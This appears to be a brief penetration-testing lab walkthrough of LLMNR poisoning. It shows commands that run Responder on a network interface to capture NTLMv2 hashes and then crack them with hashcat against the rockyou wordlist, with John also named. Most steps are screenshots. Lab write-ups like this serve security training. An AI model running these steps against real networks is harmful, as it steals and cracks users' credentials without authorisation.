## LLMNR Poisoning - Capturing NTLMv2 Hashes

$ ifconfig

![llmnr-capture-ntlmv2hash-1](https://github.com/user-attachments/assets/bb5bc126-3932-4d78-bf94-5bdab72f4557)


$ sudo responder -I eth0
![llmnr-capture-ntlmv2hash-2](https://github.com/user-attachments/assets/73eaf2a2-3ceb-4bfb-9e29-abcc2e1235d6)

![llmnr-capture-ntlmv2hash-3](https://github.com/user-attachments/assets/5301373a-0bf0-49e8-9830-d2a52a858acc)


## Trigger an LLMNR Event

![llmnr-capture-ntlmv2hash-4](https://github.com/user-attachments/assets/a75c11b5-bbb6-4470-a9db-da04be7a9f5a)


## Dumping NTLMv2 Hashes
![llmnr-capture-ntlmv2hash-5](https://github.com/user-attachments/assets/d26280ff-4be6-4117-aca5-c3ab9b35f163)


## Save Hash to a file
![llmnr-capture-ntlmv2hash-6](https://github.com/user-attachments/assets/212944c3-ccbc-4aab-aa8f-bd30558ed49f)


## Use Hashcat to crack the hash 

$ hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

![llmnr-capture-ntlmv2hash-7](https://github.com/user-attachments/assets/b686e734-88df-42f8-902f-05836a141529)

## Use John to crack the hash 

![llmnr-capture-ntlmv2hash-8](https://github.com/user-attachments/assets/022ef5f9-a64a-4fec-936f-b5a041849694)
